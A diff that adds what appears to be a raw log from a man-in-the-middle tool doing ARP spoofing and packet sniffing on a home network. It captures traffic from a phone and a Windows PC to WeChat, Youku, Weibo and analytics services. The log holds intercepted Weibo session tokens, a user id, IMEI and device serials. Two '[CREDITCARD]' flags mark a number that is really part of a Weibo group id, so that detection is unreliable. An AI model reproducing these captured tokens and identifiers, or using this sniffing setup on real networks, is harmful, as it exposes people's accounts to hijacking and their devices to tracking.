@@ -1,0 +1,863 @@
+[I] Starting [ spoofing:✔ discovery:✔ sniffer:✔ tcp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...
+
+
+[I] [en0] 192.168.2.2 : AC:BC:32:9C:A9:01 / en0 ( Apple )
+[I] [GATEWAY] 192.168.2.1 : 08:86:3B:F0:F5:B2 ( Belkin International )
+[I] [DISCOVERY] Targeting the whole subnet 192.168.2.0..192.168.2.255 ...
+[I] Acquired 4 new targets :
+
+  [NEW] 192.168.2.3 : 9C:D9:17:38:ED:9B ( Motorola Mobility, a Lenovo Company )
+  [NEW] 192.168.2.5 : 18:5E:0F:A6:1E:FE ( Intel Corporate )
+  [NEW] 192.168.2.6 : 64:BC:0C:4D:B2:78 ( LG Electronics )
+  [NEW] 224.0.0.251 : 01:00:5E:00:00:FB ( ??? )
+
+
+[I] Found NetBIOS name 'DESKTOP-2LU0P34' for address 192.168.2.5
+[192.168.2.3 > 203.205.167.185:http] [POST] http://cashort.weixin.qq.com/mmtls/68f20130
+
+[HEADERS]
+
+  Accept : */*
+  Cache-Control : no-cache
+  Connection : close
+  Content-Length : 587
+  Content-Type : application/octet-stream
+  Host : cashort.weixin.qq.com
+  Upgrade : mmtls
+  User-Agent : MicroMessenger Client
+
+[BODY]
+
+19 F1 03 00 A1 00 00 00 9D 01 03 F1 01 00 A8 5E  ...............^
+3C DB A4 18 86 E3 46 69 73 2C 0A 2A 51 E6 0C C1  <.....Fis,.*Q...
+78 EB FE 43 2B 6B FF 40 45 96 7C 3E 74 BC DE 57  x..C+k.@E.|>t..W
+54 CE 79 00 00 00 6F 01 00 00 00 6A 00 0F 01 00  T.y...o....j....
+00 00 63 01 00 09 3A 80 00 00 00 00 00 05 00 0C  ..c...:.........
+11 7C 99 C3 A2 89 4C 53 EF 07 AA 51 00 48 08 83  .|....LS...Q.H..
+DE 3D 17 6C CD 5E 4A A8 33 F4 71 D6 2D 8C 2E 3E  .=.l.^J.3.q.-..>
+CC 64 74 65 EA CC 37 09 B4 72 37 7D BE E6 B2 DB  .dte..7..r7}....
+9F 5C 0A 2C 5F A4 7C D9 96 73 9D 77 3B E1 9D E6  .\.,_.|..s.w;...
+57 DD 4E 5D 25 C3 BA EB 70 33 BB 8B 47 A9 D7 46  W.N]%...p3..G..F
+20 7E 7D AC D2 1F 19 F1 03 00 24 48 5F 51 A4 3A   ~}.......$H_Q.:
+9C 36 EE FD EA E8 B2 FB EE 16 77 9B 91 09 BD EA  .6........w.....
+D5 02 E2 4D 45 4D 0E AE C2 EC D0 22 5F C3 3C 17  ...MEM....."_.<.
+F1 03 01 5B 78 EC 82 44 36 80 36 32 5E B5 04 34  ...[x..D6.62^..4
+8A 80 B7 BD CE EF 24 E5 31 2C 16 3F EB BC 1A A9  ......$.1,.?....
+2D D9 E0 67 D4 59 42 5C 22 14 A1 26 66 63 95 C3  -..g.YB\"..&fc..
+B0 CA C3 B3 D4 C1 3D 48 CD 75 FF 92 B3 75 EB FB  ......=H.u...u..
+6B 44 E5 3E F8 9C 0E BE 02 34 40 D9 94 FA DD 5F  kD.>.....4@...._
+E6 A6 FD 12 79 69 E3 11 9A 7E ED FE CD D8 35 0F  ....yi...~....5.
+3C EA A3 12 7B 72 7B EA 84 12 8C 0B 5C 93 CD EC  <...{r{.....\...
+2C F5 AC 65 AB 93 C8 FD F0 2B BD EB 19 CA B8 08  ,..e.....+......
+EF 59 F8 26 DC FC 96 58 62 53 D0 DE F1 A7 25 21  .Y.&...XbS....%!
+40 01 21 0A AB ED 38 4B 92 63 FB 70 47 15 30 09  @.!...8K.c.pG.0.
+DE 12 FF 6C 05 D0 08 4F 3B D0 BB F3 3F 13 AA 6E  ...l...O;...?..n
+14 E5 57 8F 59 41 8A F4 25 71 C5 2C 1B 1D 3D 33  ..W.YA..%q.,..=3
+E8 47 F3 13 94 FD E3 65 FD F3 3A 20 82 38 9C 4E  .G.....e..: .8.N
+5E 23 EB F2 B4 B6 34 B5 1D EB CD DE 5A F6 0C 82  ^#....4.....Z...
+5B 41 44 91 37 C6 E7 8F F9 5D 4F 73 7F 43 35 8E  [AD.7....]Os.C5.
+D7 6A E3 F3 F8 6F 65 B9 CA 09 8E F8 58 74 58 97  .j...oe.....XtX.
+10 96 0A 59 09 B5 7D 7C E6 90 5B B2 9A 9B 3A 2C  ...Y..}|..[...:,
+0B B2 0F 80 51 68 3A 39 6F D6 2B 66 7F E3 B1 D4  ....Qh:9o.+f....
+97 7E C2 9C 73 E9 57 C7 F3 46 2F 1B 2F 3B 51 9F  .~..s.W..F/./;Q.
+F8 0C 95 8F 28 80 2A F4 E4 18 6D 01 22 74 D9 02  ....(.*...m."t..
+2D A8 41 5F 61 3D 40 1A 6A 3F 48 00 7B 09 6B 06  -.A_a=@.j?H.{.k.
+44 81 D0 2C 9C D5 AD 04 AC 9E 32 99 5C C7 AA 15  D..,......2.\...
+F1 03 00 17 96 AB 9B 80 F9 09 5E A6 52 01 80 13  ..........^.R...
+D0 7C A3 C3 E0 44 84 B5 A5 13 49                 .|...D....I
+
+
+[192.168.2.3 > 203.205.167.185:http] [POST] http://cashort.weixin.qq.com/mmtls/68f20130
+
+[HEADERS]
+
+  Accept : */*
+  Cache-Control : no-cache
+  Connection : close
+  Content-Length : 587
+  Content-Type : application/octet-stream
+  Host : cashort.weixin.qq.com
+  Upgrade : mmtls
+  User-Agent : MicroMessenger Client
+
+[BODY]
+
+19 F1 03 00 A1 00 00 00 9D 01 03 F1 01 00 A8 5E  ...............^
+3C DB A4 18 86 E3 46 69 73 2C 0A 2A 51 E6 0C C1  <.....Fis,.*Q...
+78 EB FE 43 2B 6B FF 40 45 96 7C 3E 74 BC DE 57  x..C+k.@E.|>t..W
+54 CE 79 00 00 00 6F 01 00 00 00 6A 00 0F 01 00  T.y...o....j....
+00 00 63 01 00 09 3A 80 00 00 00 00 00 05 00 0C  ..c...:.........
+11 7C 99 C3 A2 89 4C 53 EF 07 AA 51 00 48 08 83  .|....LS...Q.H..
+DE 3D 17 6C CD 5E 4A A8 33 F4 71 D6 2D 8C 2E 3E  .=.l.^J.3.q.-..>
+CC 64 74 65 EA CC 37 09 B4 72 37 7D BE E6 B2 DB  .dte..7..r7}....
+9F 5C 0A 2C 5F A4 7C D9 96 73 9D 77 3B E1 9D E6  .\.,_.|..s.w;...
+57 DD 4E 5D 25 C3 BA EB 70 33 BB 8B 47 A9 D7 46  W.N]%...p3..G..F
+20 7E 7D AC D2 1F 19 F1 03 00 24 48 5F 51 A4 3A   ~}.......$H_Q.:
+9C 36 EE FD EA E8 B2 FB EE 16 77 9B 91 09 BD EA  .6........w.....
+D5 02 E2 4D 45 4D 0E AE C2 EC D0 22 5F C3 3C 17  ...MEM....."_.<.
+F1 03 01 5B 78 EC 82 44 36 80 36 32 5E B5 04 34  ...[x..D6.62^..4
+8A 80 B7 BD CE EF 24 E5 31 2C 16 3F EB BC 1A A9  ......$.1,.?....
+2D D9 E0 67 D4 59 42 5C 22 14 A1 26 66 63 95 C3  -..g.YB\"..&fc..
+B0 CA C3 B3 D4 C1 3D 48 CD 75 FF 92 B3 75 EB FB  ......=H.u...u..
+6B 44 E5 3E F8 9C 0E BE 02 34 40 D9 94 FA DD 5F  kD.>.....4@...._
+E6 A6 FD 12 79 69 E3 11 9A 7E ED FE CD D8 35 0F  ....yi...~....5.
+3C EA A3 12 7B 72 7B EA 84 12 8C 0B 5C 93 CD EC  <...{r{.....\...
+2C F5 AC 65 AB 93 C8 FD F0 2B BD EB 19 CA B8 08  ,..e.....+......
+EF 59 F8 26 DC FC 96 58 62 53 D0 DE F1 A7 25 21  .Y.&...XbS....%!
+40 01 21 0A AB ED 38 4B 92 63 FB 70 47 15 30 09  @.!...8K.c.pG.0.
+DE 12 FF 6C 05 D0 08 4F 3B D0 BB F3 3F 13 AA 6E  ...l...O;...?..n
+14 E5 57 8F 59 41 8A F4 25 71 C5 2C 1B 1D 3D 33  ..W.YA..%q.,..=3
+E8 47 F3 13 94 FD E3 65 FD F3 3A 20 82 38 9C 4E  .G.....e..: .8.N
+5E 23 EB F2 B4 B6 34 B5 1D EB CD DE 5A F6 0C 82  ^#....4.....Z...
+5B 41 44 91 37 C6 E7 8F F9 5D 4F 73 7F 43 35 8E  [AD.7....]Os.C5.
+D7 6A E3 F3 F8 6F 65 B9 CA 09 8E F8 58 74 58 97  .j...oe.....XtX.
+10 96 0A 59 09 B5 7D 7C E6 90 5B B2 9A 9B 3A 2C  ...Y..}|..[...:,
+0B B2 0F 80 51 68 3A 39 6F D6 2B 66 7F E3 B1 D4  ....Qh:9o.+f....
+97 7E C2 9C 73 E9 57 C7 F3 46 2F 1B 2F 3B 51 9F  .~..s.W..F/./;Q.
+F8 0C 95 8F 28 80 2A F4 E4 18 6D 01 22 74 D9 02  ....(.*...m."t..
+2D A8 41 5F 61 3D 40 1A 6A 3F 48 00 7B 09 6B 06  -.A_a=@.j?H.{.k.
+44 81 D0 2C 9C D5 AD 04 AC 9E 32 99 5C C7 AA 15  D..,......2.\...
+F1 03 00 17 96 AB 9B 80 F9 09 5E A6 52 01 80 13  ..........^.R...
+D0 7C A3 C3 E0 44 84 B5 A5 13 49                 .|...D....I
+
+
+[192.168.2.3 > 31.13.69.195:https] [HTTPS] https://edge-mqtt-shv-01-iad3.facebook.com./
+[192.168.2.3 > 31.13.66.34:https] [HTTPS] https://edge-mqtt-mini-shv-01-dfw1.facebook.com./
+[192.168.2.3 > 31.13.66.34:https] [HTTPS] https://edge-mqtt-mini-shv-01-dfw1.facebook.com./
+[192.168.2.3 > 31.13.69.195:https] [HTTPS] https://edge-mqtt-shv-01-iad3.facebook.com./
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[192.168.2.3 > 119.167.222.100:http] [POST] http://sdk.m.youku.com/sdk/youku/data.json
+
+[HEADERS]
+
+  Connection : close
+  Content-Length : 112
+  Content-Type : application/x-www-form-urlencoded
+  Host : sdk.m.youku.com
+
+[BODY]
+
+  p : a1c0f66d02e2a816
+  g1 : 2b0f8211ea52dcf0c03f1209ec411201
+  g2 : a71bea18f245f3bf17764d15aafc8b0b
+  t : 1465175673
+  v : 2.3
+  s : 
+
+
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f133.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f133.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f5.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f5.1e100.net./
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:http] [GET] http://easyread.163.com/switchCategory.atom
+[192.168.2.3 > 61.135.253.204:http] [GET] http://ip.ws.126.net/ipquery
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 223.252.199.7:http] [GET] http://easyread.163.com/switchCategory.atom
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[192.168.2.3 > 61.135.253.204:http] [GET] http://ip.ws.126.net/ipquery
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f5.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 131.253.34.250:https] [HTTPS] https://bn3sch020010631.wns.windows.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f5.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 91.190.218.69:http] [GET] http://conn.skype.com/
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f5.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f133.1e100.net./
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[DESKTOP-2LU0P34/192.168.2.5 > 91.190.219.40:https] [HTTPS] https://91.190.219.40/
+[DESKTOP-2LU0P34/192.168.2.5 > 91.190.218.69:http] [GET] http://conn.skype.com/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 114.134.80.163:http] [POST] http://api.weibo.cn/2/push/active?networktype=wifi&uicode=10000001&moduleID=700&featurecode=10000001&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&luicode=10000365
+
+[HEADERS]
+
+  User-Agent : Nexus 6_6.0.1_weibo_6.5.1_android
+  Content-Type : application/x-www-form-urlencoded
+  Accept-Encoding : identity
+  X-Log-Uid : 1841460987
+  Host : api.weibo.cn
+  Connection : close
+  Content-Length : 1002
+
+[BODY]
+
+  device_name : motorola-Nexus+6
+  app_id : 1004
+  ver_feedbg : 1
+  need_cookie : 0
+  ver_remind : 282
+  device_serial : 355458060317816
+  time_changed : 1460294489565
+  checktoken : 25f0f383f8fc08f2b652f2bee490aeeb
+  sequenceid : 1465175670
+  did : 4eafe046c545b272d01b8a6205e0ac5d3c2ca6e8
+  uid : 1841460987
+  flag : 1
+  gdid : 8JT0dvFqaZNgDhY0AvdxG3zS
+  imei : 355458060317816
+  device_id : 4eafe046c545b272d01b8a6205e0ac5d3c2ca6e8
+  push_version : 2c2ce7ad9245f2a2c4d2d3d45a145c86
+  users : [{"uid":"1841460987","gsid":"_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..","current":1,"open":1,"st":"08:00:00","et":"22:00:00","tz":"America\/Chicago","lang":"en_US","sw":271}]
+  versioncode : 3205
+  packagename : com.sina.weibo
+  wei : 
+
+
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 114.134.80.163:http] [POST] http://api.weibo.cn/2/push/active?networktype=wifi&uicode=10000001&moduleID=700&featurecode=10000001&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&luicode=10000365
+
+[HEADERS]
+
+  User-Agent : Nexus 6_6.0.1_weibo_6.5.1_android
+  Content-Type : application/x-www-form-urlencoded
+  Accept-Encoding : identity
+  X-Log-Uid : 1841460987
+  Host : api.weibo.cn
+  Connection : close
+  Content-Length : 1002
+
+[BODY]
+
+  device_name : motorola-Nexus+6
+  app_id : 1004
+  ver_feedbg : 1
+  need_cookie : 0
+  ver_remind : 282
+  device_serial : 355458060317816
+  time_changed : 1460294489565
+  checktoken : 25f0f383f8fc08f2b652f2bee490aeeb
+  sequenceid : 1465175670
+  did : 4eafe046c545b272d01b8a6205e0ac5d3c2ca6e8
+  uid : 1841460987
+  flag : 1
+  gdid : 8JT0dvFqaZNgDhY0AvdxG3zS
+  imei : 355458060317816
+  device_id : 4eafe046c545b272d01b8a6205e0ac5d3c2ca6e8
+  push_version : 2c2ce7ad9245f2a2c4d2d3d45a145c86
+  users : [{"uid":"1841460987","gsid":"_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..","current":1,"open":1,"st":"08:00:00","et":"22:00:00","tz":"America\/Chicago","lang":"en_US","sw":271}]
+  versioncode : 3205
+  packagename : com.sina.weibo
+  wei : 
+
+
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[192.168.2.3 > 114.134.80.163:http] [CREDITCARD] 370788833993217
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/group_unread?networktype=wifi&group_ids=100011841460987%2C100091841460987%2C100101841460987%2C3667609730386380%2C201111240605316132%2C201111240598265614%2C201111240598353125%2C201111240501179266%2C201111240598353245%2C201111240604138288%2C3707888339932174%2C3707888390268752%2C3710510077469426%2C3887280726706824%2C100051841460987%2C100041841460987&with_url=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 114.134.80.163:http] [CREDITCARD] 370788833993217
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/group_unread?networktype=wifi&group_ids=100011841460987%2C100091841460987%2C100101841460987%2C3667609730386380%2C201111240605316132%2C201111240598265614%2C201111240598353125%2C201111240501179266%2C201111240598353245%2C201111240604138288%2C3707888339932174%2C3707888390268752%2C3710510077469426%2C3887280726706824%2C100051841460987%2C100041841460987&with_url=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[192.168.2.3 > 65.255.32.125:http] [GET] http://dynamic.app.m.letv.com/android/dynamic.php?mod=mob&ctl=ip&act=index&pcode=010110216&version=6.5.1&region=US&lang=chs
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 96.17.202.18:http] [GET] http://b.scorecardresearch.com/p2?c1=19&c2=7293931&ns_ap_an=com.youku.phone&ns_ap_pn=android&c12=152d21d60ef5555d53a1a0a962d23615-cs31&name=start&ns_ak=HD1wRQBOi0fSHb5tQuWSVM3ThdRc31MHBkCMoXDRWb4tiHV99YXQtdXH29M%2BWj7WlBMNiH88B9BYh%2BXR8C6oyzGr4xSssNhT283cgaiOt0%2FV0nmUsKD%2BabRzCMrdDctlSfHbON83BZKaxhSw6Dp2K%2FoCJU4hGT3gSmlu61JnJ6o%3D&ns_ap_ec=1&ns_ap_ev=start&ns_ap_device=shamu&ns_ap_id=1465175673401&ns_ap_csf=1&ns_ap_bi=com.youku.phone&ns_ap_pfm=android&ns_ap_pfv=6.0.1&ns_ap_ver=5.6.1&ns_ap_sv=2.1311.10&ns_type=view&ns_radio=wifi&ns_nc=1&ns_ap_gs=1421216113365&ns_ap_jb=0&ns_ap_res=1440x2392&ns_ap_install=1462286093368&ns_ap_lastrun=1465173511028&ns_ap_cs=23560&ns_ap_runs=23560&ns_ap_usage=42&ns_ap_fg=0&ns_ap_ft=0&ns_ap_dft=0&ns_ap_bt=0&ns_ap_dbt=0&ns_ap_dit=1459776&ns_ap_as=1&ns_ap_das=0&ns_ap_it=1459776&ns_ap_lang=en&ns_ts=1465175673433
+[192.168.2.3 > 96.17.202.18:http] [GET] http://b.scorecardresearch.com/p2?c1=19&c2=7293931&ns_ap_an=com.youku.phone&ns_ap_pn=android&c12=152d21d60ef5555d53a1a0a962d23615-cs31&name=start&ns_ak=HD1wRQBOi0fSHb5tQuWSVM3ThdRc31MHBkCMoXDRWb4tiHV99YXQtdXH29M%2BWj7WlBMNiH88B9BYh%2BXR8C6oyzGr4xSssNhT283cgaiOt0%2FV0nmUsKD%2BabRzCMrdDctlSfHbON83BZKaxhSw6Dp2K%2FoCJU4hGT3gSmlu61JnJ6o%3D&ns_ap_ec=1&ns_ap_ev=start&ns_ap_device=shamu&ns_ap_id=1465175673401&ns_ap_csf=1&ns_ap_bi=com.youku.phone&ns_ap_pfm=android&ns_ap_pfv=6.0.1&ns_ap_ver=5.6.1&ns_ap_sv=2.1311.10&ns_type=view&ns_radio=wifi&ns_nc=1&ns_ap_gs=1421216113365&ns_ap_jb=0&ns_ap_res=1440x2392&ns_ap_install=1462286093368&ns_ap_lastrun=1465173511028&ns_ap_cs=23560&ns_ap_runs=23560&ns_ap_usage=42&ns_ap_fg=0&ns_ap_ft=0&ns_ap_dft=0&ns_ap_bt=0&ns_ap_dbt=0&ns_ap_dit=1459776&ns_ap_as=1&ns_ap_das=0&ns_ap_it=1459776&ns_ap_lang=en&ns_ts=1465175673433
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/unread_count?remind_version=282&networktype=wifi&with_comment_attitude=1&ext_all=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&idc=&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&with_settings=1&unread_message=1&with_page_group=1
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/unread_count?remind_version=282&networktype=wifi&with_comment_attitude=1&ext_all=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&idc=&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&with_settings=1&unread_message=1&with_page_group=1
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f133.1e100.net./
